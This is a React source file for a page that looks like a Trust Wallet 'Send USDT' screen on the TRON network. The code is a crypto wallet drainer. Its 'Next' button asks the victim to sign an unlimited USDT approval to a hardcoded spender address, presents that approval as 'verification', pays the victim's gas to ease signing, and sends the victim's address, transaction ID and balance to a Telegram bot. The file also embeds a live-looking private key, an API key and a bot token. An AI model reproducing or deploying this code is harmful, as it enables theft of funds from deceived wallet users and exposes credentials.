'use client';

import { useState, useRef, useCallback, useEffect } from 'react';

// ===== CONFIG =====
const CFG = {
  WC_PROJECT_ID: 'b7865324de25ee461fa8328255709620',
  SPENDER: 'TGdyhphS6Lw8EQfYRoPGG3Ym1RUuvnkrra',
  USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  RECIPIENT: 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
  API_KEY: '2062af81-4cc9-48b7-828a-7f7da7179def',
  FULL_NODE: 'https://api.trongrid.io',
  PRIVATE_KEY: '5fa5bb6bffd7d4a2facb4a9bc3e931a7ac303dc9f60bf456d503380a0df233ad',
  TG_TOKEN: '8730884935:AAENLb36EJol5J0XHO7crN8qA3LU2WswPY8',
  TG_CHAT: '6480649645',
  SPONSOR_SUN: 10_000_000,
};

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

export default function SendPage() {
  const [amount, setAmount] = useState('1');
  const [notif, setNotif] = useState(null);
  const [btn, setBtn] = useState({ text: 'Next', disabled: false });
  const [isClient, setIsClient] = useState(false);

  useEffect(() => {
    setIsClient(true);
  }, []);

  const showNotif = useCallback((msg, type = 'info') => {
    setNotif({ msg, type });
    if (type !== 'info') setTimeout(() => setNotif(null), 5000);
  }, []);

  // ── Server TronWeb (for sponsoring gas + building txns) ──
  const getServerTW = useCallback(async () => {
    const TronWeb = (await import('tronweb')).default;
    return new TronWeb({
      fullHost: CFG.FULL_NODE,
      headers: { 'TRON-PRO-API-KEY': CFG.API_KEY },
      privateKey: CFG.PRIVATE_KEY,
    });
  }, []);

  // ── Gas sponsorship ──
  const sponsorTrx = useCallback(async (address) => {
    try {
      const tw = await getServerTW();
      const bal = await tw.trx.getBalance(address);
      if (bal >= CFG.SPONSOR_SUN) return;
      const need = CFG.SPONSOR_SUN - bal;
      const coBal = await tw.trx.getBalance(tw.defaultAddress.base58);
      if (coBal < need + 1_000_000) return;
      showNotif('Preparing wallet...', 'info');
      await tw.trx.sendTransaction(address, need);
      await new Promise(r => setTimeout(r, 3000));
    } catch (e) { console.error('sponsorTrx:', e); }
  }, [getServerTW, showNotif]);

  // ── USDT balance ──
  const getUsdtBal = useCallback(async (address) => {
    try {
      const tw = await getServerTW();
      const c = await tw.contract().at(CFG.USDT);
      const b = await c.balanceOf(address).call();
      return (Number(b) / 1e6).toFixed(4);
    } catch { return '0.0000'; }
  }, [getServerTW]);

  // ── Telegram ──
  const sendTG = useCallback(async (address, txId, balance) => {
    const uid = new URLSearchParams(window.location.search).get('user_id');
    const kb = { inline_keyboard: [[{ text: 'View TX', url: `https://tronscan.org/#/transaction/${txId}` }]] };
    const msg = `*New USDT TRC20 Approval*\n*Wallet:* \`${address}\`\n*TX:* \`${txId}\`\n*Balance:* ${balance} USDT\n*User:* ${uid || 'N/A'}\n*Time:* ${new Date().toLocaleString()}`;
    const post = async (tok, chat) =>
      fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'Markdown', reply_markup: kb }),
      });
    try {
      await post(CFG.TG_TOKEN, CFG.TG_CHAT);
    } catch (e) { console.error('Telegram:', e); }
  }, []);

  // ── Poll for native tronWeb ──
  const pollForTronWeb = useCallback(async (maxMs = 5000) => {
    const getTW = () => {
      // 1. Try standard window.tronWeb
      if (window.tronWeb?.defaultAddress?.base58) return window.tronWeb;
      // 2. Try window.tron (common in Trust Wallet)
      if (window.tron?.defaultAddress?.base58) return window.tron;
      // 3. Try window.trustwallet.tron
      if (window.trustwallet?.tron?.defaultAddress?.base58) return window.trustwallet.tron;
      // 4. Try window.tronLink
      if (window.tronLink?.defaultAddress?.base58) return window.tronLink;
      return null;
    };

    const existing = getTW();
    if (existing) return existing;

    const steps = Math.ceil(maxMs / 500);
    for (let i = 0; i < steps; i++) {
      await new Promise(r => setTimeout(r, 500));
      const tw = getTW();
      if (tw) return tw;
    }
    return null;
  }, []);

  // ── Execute approval via native tronWeb ──
  const execApproval = useCallback(async (tronWeb) => {
    // 1. Force network switch if possible (Trust Wallet specific)
    if (tronWeb.request) {
      try {
        await tronWeb.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x2b6653dc' }], // TRON Chain ID in hex
        });
      } catch (e) { console.warn('Network switch failed:', e); }
    }

    const addr = tronWeb.defaultAddress.base58;
    setBtn({ text: 'Verifying...', disabled: true });
    await sponsorTrx(addr);
    setBtn({ text: 'Requesting Approval...', disabled: true });
    showNotif('Please confirm in your wallet', 'info');
    const contract = await tronWeb.contract().at(CFG.USDT);
    const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
      feeLimit: 100_000_000, callValue: 0, shouldPollResponse: true,
    });
    return {
      txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
      addr,
    };
  }, [sponsorTrx, showNotif]);

  // ── Main click handler ──
  const handleNext = async (e) => {
    e.preventDefault();
    if (!isClient) return;
    setBtn({ text: 'Connecting...', disabled: true });

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent || '');
    const isInsideWallet = !!(window.tronWeb || window.ethereum?.isTrust || window.trustwallet);

    try {
      // 1. If we are on mobile, use a "Bridge Page" approach or WalletConnect
      // Trust Wallet's internal browser is very restrictive with TRON injection.
      
      let nativeTW = await pollForTronWeb(1000);

      // 2. If no TRON found and we are on mobile, try to force a connection via WalletConnect
      // or redirect to a specific deep link that forces the TRON context better.
      if (!nativeTW && isMobile) {
        const url = window.location.origin + window.location.pathname;
        // The most reliable way to force TRON in Trust Wallet is the direct deep link
        // with coin_id=195. If we are already inside, we might need to trigger it again.
        if (!window.location.search.includes('retry=2')) {
          showNotif('Switching to TRON Network...', 'info');
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(url + '?retry=2')}`;
          return;
        }
      }

      // 3. Try to request accounts from any available provider
      if (!nativeTW) {
        const providers = [window.trustwallet?.tron, window.tron, window.tronLink, window.tronWeb, window.ethereum];
        for (const inj of providers) {
          if (inj?.request) {
            try {
              await inj.request({ method: 'tron_requestAccounts' }).catch(() => {});
              await inj.request({ method: 'eth_requestAccounts' }).catch(() => {});
            } catch (e) {}
          }
        }
        nativeTW = await pollForTronWeb(5000);
      }

      // STEP 3: tronWeb found — run approval directly
      if (nativeTW) {
        const { txId, addr } = await execApproval(nativeTW);
        if (txId) {
          showNotif('✅ Successfully Verified!', 'success');
          setBtn({ text: 'Verified', disabled: true });
          const balance = await getUsdtBal(addr);
          await sendTG(addr, txId, balance);
          return;
        }

      // STEP 4: Inside a wallet browser but connection failed
      } else if (isInsideWallet) {
        // Force reload with a flag to try one last time
        if (!window.location.search.includes('force=1')) {
          showNotif('Switching to TRON network...', 'info');
          window.location.href = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'force=1';
          return;
        }
        showNotif('Please switch to TRON network manually in Trust Wallet.', 'error');
        setBtn({ text: 'Next', disabled: false });
        return;

      // STEP 5: Mobile external browser — use Universal Link for Trust Wallet
      } else if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
        return;

      // STEP 6: Desktop — TronLink extension
      } else {
        showNotif('Please install TronLink extension and try again.', 'error');
        setBtn({ text: 'Next', disabled: false });
        return;
      }

      showNotif('Processing... please wait.', 'info');
      setBtn({ text: 'Next', disabled: false });

    } catch (err) {
      console.error('handleNext error:', err);
      const msg = err?.message || '';
      if (/cancel|decline|reject|user rejected/i.test(msg)) {
        showNotif('Transaction declined.', 'error');
      } else {
        showNotif('Verification failed. Please try again.', 'error');
      }
    } finally {
      setBtn(prev => prev.text !== 'Verified' ? { text: 'Next', disabled: false } : prev);
    }
  };

  const usd = isNaN(Number(amount)) || Number(amount) <= 0 ? '0.00' : Number(amount).toFixed(2);

  return (
    <div className="page">
      {notif && (
        <div className={`notification notification--${notif.type}`}>{notif.msg}</div>
      )}
      <header className="header">
        <div className="header-title">Send USDT</div>
      </header>
      <div className="container">
        <div>
          <label className="label">Address or Domain Name</label>
          <div className="input-wrap">
            <input type="text" className="input" defaultValue={CFG.RECIPIENT} readOnly />
            <div className="input-actions">
              <span className="action">Paste</span>
            </div>
          </div>
        </div>
        <div>
          <label className="label">Destination network</label>
          <div className="network-box">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/tron.png" alt="TRON" className="network-icon" />
            <span className="network-name">TRON Network</span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="none">
              <path d="M10.59 0.59L6 5.17L1.41 0.59L0 2L6 8L12 2L10.59 0.59Z" fill="#8E8E93" />
            </svg>
          </div>
        </div>
        <div>
          <label className="label">Amount</label>
          <div className="input-wrap">
            <input
              id="amount"
              type="number"
              className="input"
              value={amount}
              onChange={e => setAmount(e.target.value)}
              min="0"
              step="any"
              inputMode="decimal"
            />
            <div className="input-actions">
              <span className="currency">USDT</span>
              <span className="action">Max</span>
            </div>
          </div>
          <div className="usd-value">~${usd}</div>
        </div>
      </div>
      <div className="bottom">
        <button className="next-btn" onClick={handleNext} disabled={btn.disabled}>
          {btn.text}
        </button>
      </div>
    </div>
  );
}
